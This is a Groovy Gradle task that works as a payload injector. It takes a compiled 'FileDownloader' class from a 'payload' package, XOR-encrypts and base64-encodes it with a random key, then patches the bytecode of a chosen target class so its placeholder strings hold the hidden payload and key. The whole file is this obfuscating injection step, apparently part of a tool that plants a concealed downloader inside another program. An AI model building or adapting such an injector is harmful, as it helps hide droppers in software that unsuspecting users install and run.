package com.tmquan2508.gradle

import org.gradle.api.DefaultTask
import org.gradle.api.file.DirectoryProperty
import org.gradle.api.provider.Property
import org.gradle.api.tasks.Input
import org.gradle.api.tasks.InputDirectory
import org.gradle.api.tasks.OutputDirectory
import org.gradle.api.tasks.TaskAction
import org.objectweb.asm.ClassReader
import org.objectweb.asm.ClassWriter
import org.objectweb.asm.tree.*

import java.nio.file.Files
import java.security.SecureRandom

abstract class InjectDownloaderTask extends DefaultTask {

    @InputDirectory
    abstract DirectoryProperty getClassesDir()

    @OutputDirectory
    abstract DirectoryProperty getOutputClassesDir()

    @InputDirectory
    abstract DirectoryProperty getDownloaderClassesDir()

    @Input
    abstract Property<String> getTargetClass()

    private static final String DOWNLOADER_CLASS_NAME = "com.tmquan2508.payload.FileDownloader"

    @TaskAction
    void execute() {
        String downloaderClassPath = DOWNLOADER_CLASS_NAME.replace('.', '/') + ".class"
        File downloaderClassFile = downloaderClassesDir.get().file(downloaderClassPath).asFile
        
        if (!downloaderClassFile.exists()) {
            throw new RuntimeException("Could not find compiled downloader class: " + downloaderClassFile)
        }
        
        byte[] payloadBytes = downloaderClassFile.readBytes()
        String key = generateRandomKey(32)
        String encryptedPayload = encrypt(payloadBytes, key)

        def replacementMap = [
            "::KEY::"                   : key,
            "::ENCRYPTED_PAYLOAD::"     : encryptedPayload,
            "::DOWNLOADER_CLASS_NAME::" : DOWNLOADER_CLASS_NAME
        ]

        logger.lifecycle("-> Preparing to inject data into ${targetClass.get()}:")
        replacementMap.each { placeholder, value ->
            def sizeInBytes = value.getBytes("UTF-8").length
            def sizeInKb = sizeInBytes / 1024.0
            logger.lifecycle(String.format("  [INJECT] Injecting '%-25s' -> Size: %.2f KB", placeholder, sizeInKb))
        }
        
        String targetPath = targetClass.get().replace('.', '/') + ".class"
        def inPath = classesDir.get().file(targetPath).asFile.toPath()
        byte[] classBytes = Files.readAllBytes(inPath)

        ClassReader cr = new ClassReader(classBytes)
        ClassNode cn = new ClassNode()
        cr.accept(cn, 0)

        cn.methods?.each { MethodNode mn ->
            mn.instructions?.each { AbstractInsnNode insn ->
                if (insn instanceof LdcInsnNode) {
                    def cst = (insn as LdcInsnNode).cst
                    if (cst instanceof String && replacementMap.containsKey(cst)) {
                        (insn as LdcInsnNode).cst = replacementMap.get(cst)
                    }
                }
            }
        }

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES)
        cn.accept(cw)
        byte[] outBytes = cw.toByteArray()

        def targetOut = outputClassesDir.get().file(targetPath).asFile.toPath()
        Files.createDirectories(targetOut.getParent())
        Files.write(targetOut, outBytes)
        logger.lifecycle("-> Successfully wrote patched class to ${targetOut}")
    }

    static String generateRandomKey(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        new SecureRandom().with { (0..<length).collect { chars[ nextInt(chars.length()) ] }.join() }
    }

    static String encrypt(byte[] plainBytes, String key) {
        byte[] keyBytes = key.bytes
        byte[] result = new byte[plainBytes.length]
        for (int i = 0; i < plainBytes.length; i++) {
            result[i] = (byte) (plainBytes[i] ^ keyBytes[i % keyBytes.length])
        }
        return result.encodeBase64().toString()
    }
}